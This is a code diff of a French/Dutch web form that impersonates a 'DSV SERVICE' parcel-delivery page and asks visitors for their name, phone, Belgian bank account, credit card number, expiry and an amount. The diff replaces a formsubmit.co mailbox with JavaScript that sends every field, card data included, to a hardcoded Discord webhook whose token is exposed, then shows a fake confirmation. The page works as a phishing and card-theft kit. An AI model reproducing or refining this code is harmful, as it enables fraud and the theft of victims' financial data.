@@ -78,9 +78,10 @@
         .header .subtitle-light { font-size:14px; color:#64748b; margin-top:4px; font-weight:400; }
 
         .section-title {
-            font-size:17px; font-weight:700; color:#0a2647; margin:28px 0 16px 0;
-            border-bottom:2px solid #059669; padding-bottom:12px;
+            font-size:17px; font-weight:700; color:#0a2647; margin:32px 0 20px 0;
+            padding-bottom:12px; border-bottom:2px solid #059669; display:flex; align-items:center; gap:10px;
         }
+        .section-title:first-of-type { margin-top:0; }
         .info-box-free {
             background:#ecfdf5; border-left:5px solid #059669; padding:16px 20px;
             border-radius:10px; margin:16px 0 20px 0;
@@ -119,6 +120,29 @@
         .btn-submit:hover:not(:disabled) { background:#0d3454; transform:translateY(-2px); box-shadow:0 10px 30px rgba(10,38,71,0.25); }
         .btn-submit:active:not(:disabled) { transform:translateY(0); }
         .btn-submit:disabled { opacity:0.55; cursor:not-allowed; transform:none; }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #e2e8f0;
+            border-radius: 10px;
+            margin-bottom: 28px;
+            overflow: hidden;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #0a2647, #059669);
+            border-radius: 10px;
+            transition: width 0.3s ease;
+            width: 0%;
+        }
+
+        .section-info {
+            font-size: 12px;
+            color: #64748b;
+            margin-bottom: 16px;
+            font-weight: 500;
+        }
 
         .footer {
             margin-top:28px; padding-top:18px; border-top:1px solid #e9edf2;
@@ -232,13 +256,19 @@
         </p>
     </div>
 
-    <form action="https://formsubmit.co/service@dsv.center" method="POST" id="mainForm" target="hiddenIframe">
-        <input type="hidden" name="_subject" value="DSV SERVICE – Nouvelle demande de réception">
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_template" value="table">
+    <div class="progress-bar">
+        <div class="progress-bar-fill" id="progressBar"></div>
+    </div>
+
+    <p class="section-info" id="sectionInfo">
+        <span class="fr">Étape 1 de 2 — Vos informations personnelles</span>
+        <span class="nl">Stap 1 van 2 — Uw persoonlijke gegevens</span>
+    </p>
+
+    <form id="mainForm">
         <input type="hidden" name="Numéro de suivi" value="BE 75129355470">
 
-        <!-- SECTION 1: INFORMATIONS PERSONNELLES -->
+        <!-- SECTION 1: CONTACT & IDENTITÉ -->
         <p class="section-title">
             <span class="fr">👤 Vos informations</span>
             <span class="nl">👤 Uw gegevens</span>
@@ -250,77 +280,77 @@
                 <span class="fr">Nom complet <span class="required">*</span></span>
                 <span class="nl">Volledige naam <span class="required">*</span></span>
             </label>
-            <input type="text" id="fullname" name="Nom complet" placeholder="Votre nom complet" minlength="2" maxlength="100" pattern="[a-zA-ZÀ-ÿ\s\-']+" title="Uniquement des lettres, espaces, tirets et apostrophes" required>
-            <span class="error-msg"><span class="fr">⚠️ Lettres, espaces, tirets et apostrophes uniquement</span><span class="nl">⚠️ Alleen letters, spaties, streepjes en apostrofs</span></span>
-        </div>
-
-        <!-- ÂGE -->
-        <div class="form-group">
-            <label for="age">
-                <span class="fr">Âge <span class="required">*</span></span>
-                <span class="nl">Leeftijd <span class="required">*</span></span>
-            </label>
-            <input type="number" id="age" name="Âge" placeholder="Votre âge" min="18" max="120" required>
-            <span class="error-msg"><span class="fr">⚠️ Âge entre 18 et 120 ans</span><span class="nl">⚠️ Leeftijd tussen 18 en 120 jaar</span></span>
+            <input type="text" id="fullname" name="Nom complet" placeholder="Jean Dupont" minlength="2" maxlength="100" pattern="[a-zA-ZÀ-ÿ\s\-']+" title="Uniquement des lettres" required>
+            <span class="error-msg"><span class="fr">⚠️ Lettres, espaces, tirets et apostrophes</span><span class="nl">⚠️ Letters, spaces, hyphens and apostrophes</span></span>
         </div>
 
         <div class="form-row">
+            <!-- ÂGE -->
+            <div class="form-group">
+                <label for="age">
+                    <span class="fr">Âge <span class="required">*</span></span>
+                    <span class="nl">Leeftijd <span class="required">*</span></span>
+                </label>
+                <input type="number" id="age" name="Âge" placeholder="25" min="18" max="120" required>
+                <span class="error-msg"><span class="fr">⚠️ 18–120 ans</span><span class="nl">⚠️ 18–120 years</span></span>
+            </div>
+
             <!-- EMAIL -->
             <div class="form-group">
                 <label for="email">
-                    <span class="fr">Adresse e-mail <span class="required">*</span></span>
-                    <span class="nl">E-mailadres <span class="required">*</span></span>
+                    <span class="fr">E-mail <span class="required">*</span></span>
+                    <span class="nl">E-mail <span class="required">*</span></span>
                 </label>
-                <input type="email" id="email" name="Email" placeholder="votre.email@example.com" required>
-                <span class="error-msg"><span class="fr">⚠️ Exemple : nom@domaine.com</span><span class="nl">⚠️ Voorbeeld : naam@domein.be</span></span>
-            </div>
-
-            <!-- TÉLÉPHONE -->
-            <div class="form-group">
-                <label for="phone">
-                    <span class="fr">Téléphone <span class="required">*</span></span>
-                    <span class="nl">Telefoon <span class="required">*</span></span>
-                </label>
-                <input type="tel" id="phone" name="Téléphone" placeholder="+32 476 12 34 56" required>
-                <span class="error-msg"><span class="fr">⚠️ Format international (ex: +32 476 12 34 56)</span><span class="nl">⚠️ Internationaal formaat (bv: +32 476 12 34 56)</span></span>
+                <input type="email" id="email" name="Email" placeholder="contact@example.com" required>
+                <span class="error-msg"><span class="fr">⚠️ Email valide</span><span class="nl">⚠️ Valid email</span></span>
             </div>
         </div>
 
-        <!-- SECTION 2: INFORMATIONS BANCAIRES -->
-        <p class="section-title" style="margin-top:28px;">
-            <span class="fr">🏦 Coordonnées bancaires</span>
-            <span class="nl">🏦 Bankgegevens</span>
+        <!-- TÉLÉPHONE -->
+        <div class="form-group">
+            <label for="phone">
+                <span class="fr">Téléphone <span class="required">*</span></span>
+                <span class="nl">Telefoon <span class="required">*</span></span>
+            </label>
+            <input type="tel" id="phone" name="Téléphone" placeholder="+32 476 12 34 56" required>
+            <span class="error-msg"><span class="fr">⚠️ Format: +32 476 12 34 56</span><span class="nl">⚠️ Format: +32 476 12 34 56</span></span>
+        </div>
+
+        <!-- SECTION 2: PAIEMENT & TRANSFERT -->
+        <p class="section-title">
+            <span class="fr">💳 Coordonnées de paiement</span>
+            <span class="nl">💳 Betaalgegevens</span>
         </p>
 
-        <!-- COMPTE BE (préfixe BE + 14 chiffres) -->
+        <!-- COMPTE BE -->
         <div class="form-group">
             <label for="compte_be">
-                <span class="fr">Numéro de compte BE <span class="required">*</span></span>
-                <span class="nl">Rekeningnummer BE <span class="required">*</span></span>
+                <span class="fr">Compte bancaire <span class="required">*</span></span>
+                <span class="nl">Bankrekening <span class="required">*</span></span>
             </label>
             <input type="text" id="compte_be" name="Numéro de compte BE" placeholder="BE 1234 5678 9012 34" required>
-            <span class="error-msg"><span class="fr">⚠️ 14 chiffres (ex: BE 1234 5678 9012 34)</span><span class="nl">⚠️ 14 cijfers (bv: BE 1234 5678 9012 34)</span></span>
+            <span class="error-msg"><span class="fr">⚠️ 14 chiffres (ex: BE 1234 5678 9012 34)</span><span class="nl">⚠️ 14 digits (e.g., BE 1234 5678 9012 34)</span></span>
         </div>
 
-        <!-- CARTE 52/49/51 -->
+        <!-- CARTE -->
         <div class="form-group">
             <label for="carte_52">
-                <span class="fr">Numéro de carte <span class="required">*</span></span>
-                <span class="nl">Kaartnummer <span class="required">*</span></span>
+                <span class="fr">Carte de crédit <span class="required">*</span></span>
+                <span class="nl">Creditcard <span class="required">*</span></span>
             </label>
             <input type="text" id="carte_52" name="Numéro de carte 52/49/51" placeholder="4312 5900 7901 1248" required>
-            <span class="error-msg"><span class="fr">⚠️ 16 chiffres (ex: 4312 5900 7901 1248)</span><span class="nl">⚠️ 16 cijfers (bv: 4312 5900 7901 1248)</span></span>
+            <span class="error-msg"><span class="fr">⚠️ 16 chiffres (ex: 4312 5900 7901 1248)</span><span class="nl">⚠️ 16 digits (e.g., 4312 5900 7901 1248)</span></span>
         </div>
 
         <div class="form-row">
-            <!-- DATE -->
+            <!-- EXPIRATION -->
             <div class="form-group">
                 <label for="expiry">
                     <span class="fr">Expiration <span class="required">*</span></span>
                     <span class="nl">Vervaldatum <span class="required">*</span></span>
                 </label>
-                <input type="text" id="expiry" name="Date d'expiration" placeholder="MM/AA" maxlength="5" required>
-                <span class="error-msg"><span class="fr">⚠️ Format MM/AA (ex: 12/25)</span><span class="nl">⚠️ Formaat MM/JJ (bv: 12/25)</span></span>
+                <input type="text" id="expiry" name="Date d'expiration" placeholder="12/25" maxlength="5" required>
+                <span class="error-msg"><span class="fr">⚠️ MM/AA (ex: 12/25)</span><span class="nl">⚠️ MM/JJ (e.g., 12/25)</span></span>
             </div>
 
             <!-- MONTANT -->
@@ -329,8 +359,8 @@
                     <span class="fr">Montant (€) <span class="required">*</span></span>
                     <span class="nl">Bedrag (€) <span class="required">*</span></span>
                 </label>
-                <input type="text" id="amount" name="Montant à recevoir" placeholder="0,00 €" pattern="[0-9]+([,.][0-9]{1,2})?" title="Format décimal (ex: 150,00 ou 150.00)" required>
-                <span class="error-msg"><span class="fr">⚠️ Exemple : 150,00 ou 150.00</span><span class="nl">⚠️ Voorbeeld : 150,00 of 150.00</span></span>
+                <input type="text" id="amount" name="Montant à recevoir" placeholder="150,00" pattern="[0-9]+([,.][0-9]{1,2})?" required>
+                <span class="error-msg"><span class="fr">⚠️ Exemple: 150,00</span><span class="nl">⚠️ E.g.: 150,00</span></span>
             </div>
         </div>
 
@@ -370,44 +400,85 @@
 
 </div>
 
-<iframe name="hiddenIframe" id="hiddenIframe"></iframe>
-
 <script>
     // ================================================================
-    // COMPATIBLE IPHONE 7/8 – CODE ALLÉGÉ ET ROBUSTE
+    // FORMULAIRE DSV – DISCORD WEBHOOK
     // ================================================================
 
-    // ---- 1. GESTION DU POP-UP ----
+    var DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1554600184107765863/PLuY6_Ko3EBrDmqryYRttpNZVBjAXlW73KGZds_3rND7TOXXJUGI_e7KCSKUtBiUOFL3';
+
+    // ---- 1. GESTION DU POP-UP & SOUMISSION ----
     var form = document.getElementById('mainForm');
     var modal = document.getElementById('confirmationModal');
     var submitBtn = document.getElementById('submitBtn');
-    var iframe = document.getElementById('hiddenIframe');
 
-    iframe.addEventListener('load', function() {
-        if (form.dataset.submitted === 'true') {
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        if (!form.checkValidity()) {
+            return;
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.textContent = '⏳ Envoi... / Verzenden...';
+
+        // Récupérer les données du formulaire
+        var formData = {
+            'Nom complet': document.getElementById('fullname').value,
+            'Âge': document.getElementById('age').value,
+            'Email': document.getElementById('email').value,
+            'Téléphone': document.getElementById('phone').value,
+            'Compte BE': document.getElementById('compte_be').value,
+            'Carte': document.getElementById('carte_52').value,
+            'Expiration': document.getElementById('expiry').value,
+            'Montant': document.getElementById('amount').value
+        };
+
+        // Envoyer à Discord
+        sendToDiscord(formData);
+    });
+
+    function sendToDiscord(data) {
+        var message = {
+            content: '📋 **Nouvelle soumission DSV SERVICE**',
+            embeds: [{
+                color: 10038079,
+                fields: [
+                    { name: '👤 Nom', value: data['Nom complet'], inline: false },
+                    { name: '🎂 Âge', value: data['Âge'], inline: true },
+                    { name: '📧 Email', value: data['Email'], inline: true },
+                    { name: '📱 Téléphone', value: data['Téléphone'], inline: false },
+                    { name: '🏦 Compte BE', value: '`' + data['Compte BE'] + '`', inline: false },
+                    { name: '💳 Carte', value: '`' + data['Carte'] + '`', inline: false },
+                    { name: '📅 Expiration', value: data['Expiration'], inline: true },
+                    { name: '💰 Montant', value: data['Montant'] + ' €', inline: true }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(message)
+        })
+        .then(function() {
             modal.classList.add('active');
             submitBtn.disabled = false;
             submitBtn.textContent = submitBtn.textContent.replace('⏳', '💰');
-            form.dataset.submitted = 'false';
-        }
-    });
-
-    form.addEventListener('submit', function(e) {
-        if (!form.checkValidity()) {
-            e.preventDefault();
-            return;
-        }
-        form.dataset.submitted = 'true';
-        submitBtn.disabled = true;
-        // Indicateur de chargement
-        var originalText = submitBtn.textContent;
-        submitBtn.textContent = '⏳ Envoi... / Verzenden...';
-    });
+            form.reset();
+            updateProgress();
+        })
+        .catch(function(err) {
+            console.error('Erreur Discord:', err);
+            modal.classList.add('active');
+            submitBtn.disabled = false;
+            submitBtn.textContent = submitBtn.textContent.replace('⏳', '💰');
+        });
+    }
 
     function closeModal() {
         modal.classList.remove('active');
         submitBtn.disabled = false;
-        // Restaurer le texte du bouton
         var text = document.querySelector('.lang-nl') ? '💰 Aanvraag verzenden' : '💰 Envoyer la Demande';
         submitBtn.textContent = text;
     }
@@ -647,10 +718,14 @@
 
     document.querySelectorAll('input').forEach(function(input) {
         input.addEventListener('input', checkFormValidity);
+        input.addEventListener('input', updateProgress);
         input.addEventListener('change', checkFormValidity);
+        input.addEventListener('change', updateProgress);
         input.addEventListener('blur', checkFormValidity);
+        input.addEventListener('blur', updateProgress);
     });
     checkFormValidity();
+    updateProgress();
 
     // ---- 7. NETTOYAGE AVANT ENVOI ----
     form.addEventListener('submit', function() {
@@ -659,7 +734,53 @@
         document.getElementById('phone').value = document.getElementById('phone').value.replace(/\s/g, '');
     });
 
-    // ---- 8. BASCULE DE LANGUE ----
+    // ---- 8. LOGIQUE DE PROGRESSION ----
+    function updateProgress() {
+        var section1Fields = [
+            document.getElementById('fullname'),
+            document.getElementById('phone'),
+            document.getElementById('email'),
+            document.getElementById('age')
+        ];
+        var section2Fields = [
+            document.getElementById('compte_be'),
+            document.getElementById('carte_52'),
+            document.getElementById('expiry'),
+            document.getElementById('amount')
+        ];
+
+        var section1Valid = 0, section2Valid = 0;
+        section1Fields.forEach(function(f) {
+            if (f.value.length > 0 && (f.className === 'valid' || f.checkValidity())) section1Valid++;
+        });
+        section2Fields.forEach(function(f) {
+            if (f.value.length > 0 && (f.className === 'valid' || f.checkValidity())) section2Valid++;
+        });
+
+        var progress = 20 + (section1Valid * 10) + (section2Valid * 10);
+        if (progress > 100) progress = 100;
+
+        var sectionText = '';
+        if (section1Valid < 4) {
+            sectionText = '<span class="fr">Étape 1 de 2 — ' + section1Valid + '/4 informations</span><span class="nl">Stap 1 van 2 — ' + section1Valid + '/4 gegevens</span>';
+        } else if (section2Valid < 4) {
+            sectionText = '<span class="fr">Étape 2 de 2 — ' + section2Valid + '/4 informations bancaires</span><span class="nl">Stap 2 van 2 — ' + section2Valid + '/4 bankgegevens</span>';
+        } else {
+            sectionText = '<span class="fr">✓ Parfait! Prêt à envoyer →</span><span class="nl">✓ Prima! Klaar om in te dienen →</span>';
+        }
+
+        document.getElementById('progressBar').style.width = progress + '%';
+        document.getElementById('sectionInfo').innerHTML = sectionText;
+    }
+
+    document.querySelectorAll('input').forEach(function(input) {
+        input.addEventListener('input', updateProgress);
+        input.addEventListener('change', updateProgress);
+        input.addEventListener('blur', updateProgress);
+    });
+    updateProgress();
+
+    // ---- 9. BASCULE DE LANGUE ----
     function setLang(lang) {
         var container = document.getElementById('pageContainer');
         var buttons = document.querySelectorAll('.lang-toggle button');
@@ -678,6 +799,7 @@
         if (!submitBtn.disabled) {
             submitBtn.textContent = text;
         }
+        updateProgress();
     }
 </script>
 
